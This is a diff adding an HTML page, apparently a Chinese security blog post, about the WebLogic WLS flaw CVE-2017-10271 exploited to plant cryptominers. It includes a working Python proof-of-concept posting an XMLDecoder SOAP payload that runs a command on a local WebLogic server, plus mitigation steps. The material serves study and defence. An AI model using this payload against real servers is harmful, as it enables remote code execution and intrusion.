@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Weblogic," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Weblogic漏洞被利用来挖矿，客户受到了影响。学习一下其中的原理。">
+<meta name="keywords" content="Weblogic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic 漏洞被利用挖矿">
+<meta property="og:url" content="http://yoursite.com/2018/01/22/weblogic/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="Weblogic漏洞被利用来挖矿，客户受到了影响。学习一下其中的原理。">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-22/59187743.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-22/71865798.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-22/13275873.jpg">
+<meta property="og:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-22/34403717.jpg">
+<meta property="og:updated_time" content="2018-01-26T02:23:12.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Weblogic 漏洞被利用挖矿">
+<meta name="twitter:description" content="Weblogic漏洞被利用来挖矿，客户受到了影响。学习一下其中的原理。">
+<meta name="twitter:image" content="http://opmi2ydgh.bkt.clouddn.com//18-1-22/59187743.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/01/22/weblogic/"/>
+
+
+
+
+
+  <title>Weblogic 漏洞被利用挖矿 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/22/weblogic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Weblogic 漏洞被利用挖矿</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-22T18:13:23+08:00">
+                2018-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全研究/" itemprop="url" rel="index">
+                    <span itemprop="name">安全研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><code>Weblogic</code>漏洞被利用来挖矿，客户受到了影响。学习一下其中的原理。</p>
+<a id="more"></a>
+<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>2017年12月中旬，安全研究者爆出未打补丁的<code>WebLogic</code>版本存在的漏洞，可能被<code>watch-smarted</code>挖矿恶意软件利用。</p>
+<p>攻击者利用<code>Weblogic WLS</code>组件漏洞(<code>CVE-2017-10271</code>)，构造<code>payload</code>下载并执行虚拟币挖矿程序，对<code>Weblogic</code>中间件主机进行攻击。</p>
+<p><strong>影响版本</strong></p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-22/59187743.jpg" alt=""></p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><a href="http://blog.csdn.net/acmman/article/details/70093877" target="_blank" rel="noopener">安装Webloginc</a></p>
+<p>访问 <code>7001</code>端口</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-22/71865798.jpg" alt=""></p>
+<p>脚本弹计算器。就是一个请求，把其中的恶意代码写在了<code>POST</code>的<code>xml</code>里面。关键是其中的利用代码的编写。</p>
+<pre><code>#! -*- coding:utf-8 -*-
+import requests
+
+url = &quot;http://127.0.0.1&quot;7001/wls-wsat/CoordinatorPorType&quot;
+xml = &apos;&apos;&apos;
+    &lt;soapenv:Envelope     xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+
+    &lt;soapenv:Header&gt;
+       &lt;work:WorkContext    xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+           &lt;java      version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+                &lt;void     class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                    &lt;array    class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+                        &lt;void     index=&quot;0&quot;&gt;
+                            &lt;string&gt;calc&lt;/string&gt;
+                        &lt;/void&gt;
+                        &lt;void     index=&quot;1&quot;&gt;
+                            &lt;string&gt;/c&lt;/string&gt;
+                        &lt;/void&gt;
+                        &lt;void     index=&quot;2&quot;&gt;
+                            &lt;string&gt;&lt;/string&gt;
+                        &lt;/void&gt;
+                    &lt;/array&gt;
+                &lt;void     method=&quot;start&quot;/&gt;&lt;/void&gt;
+           &lt;/java&gt;
+       &lt;/work:WorkContext&gt;
+   &lt;/soapenv:Header&gt;
+    &lt;soapenv:Body/&gt;
+    &lt;/soapenv:Envelope&gt;
+&apos;&apos;&apos;
+r =requests.post(url,headers={&apos;Content-Type&apos;:&apos;text/xml&apos;,&apos;Cache-Control&apos;:&apos;no-cache&apos;},data=xml)
+print r.status_code
+
+print r.text
+</code></pre><p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-22/13275873.jpg" alt=""></p>
+<p>抓包修改</p>
+<p><img src="http://opmi2ydgh.bkt.clouddn.com//18-1-22/34403717.jpg" alt=""></p>
+<h4 id="挖矿分析"><a href="#挖矿分析" class="headerlink" title="挖矿分析"></a>挖矿分析</h4><p>使用<code>top</code>命令查看<code>CPU</code>利用情况。</p>
+<p>通过<code>POC</code>可以知道，在xml中的string标签的字符串为远程执行的命令内容。攻击者首先下载<code>setup-watch</code>的<code>shell</code>脚本，其作用是下载并运行<code>watch-smartd</code>挖矿程序。</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>找了两篇从代码层面的分析文章，学习一下其中的原理。</p>
+<p><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">Weblogic XMLDecoder RCE分析</a></p>
+<p><a href="https://xianzhi.aliyun.com/forum/topic/1849" target="_blank" rel="noopener">WebLogic WLS-WebServices组件反序列化漏洞分析</a></p>
+<h4 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h4><p>攻击者利用的是<code>wls-wsat</code>组件的<code>CoordinatorPorType</code>接口，若<code>Weblogic</code>服务器集群中应用此组件，建议临时备份后将此组件删除，并重启服务器。</p>
+<p>根据自己服务器的实际路径，删除该组件</p>
+<pre><code>rm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war 
+rm -f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war 
+rm -rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat 
+</code></pre><p>重启<code>Weblogic</code>服务</p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="http://blog.nsfocus.net/weblogic-solution/" target="_blank" rel="noopener">Weblogic WLS 组件漏洞</a></p>
+<p><a href="https://cert.360.cn/static/files/利用WebLogic漏洞挖矿事件分析.pdf" target="_blank" rel="noopener">利用WebLogic 漏洞挖矿事件分析</a></p>
+<p><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">Weblogic XMLDecoder RCE分析</a></p>
+<p><a href="https://xianzhi.aliyun.com/forum/topic/1849" target="_blank" rel="noopener">WebLogic WLS-WebServices组件反序列化漏洞分析</a></p>
+<p><a href="http://www.freebuf.com/articles/system/129459.html" target="_blank" rel="noopener">利用服务器漏洞挖矿黑产案例分析</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Weblogic/" rel="tag"># Weblogic</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/11/SQLi_shell/" rel="next" title="SQL注入写shell不成功后">
+                <i class="fa fa-chevron-left"></i> SQL注入写shell不成功后
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/25/选择排序法/" rel="prev" title="选择排序算法">
+                选择排序算法 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现"><span class="nav-number">2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#挖矿分析"><span class="nav-number">3.</span> <span class="nav-text">挖矿分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#缓解措施"><span class="nav-number">5.</span> <span class="nav-text">缓解措施</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
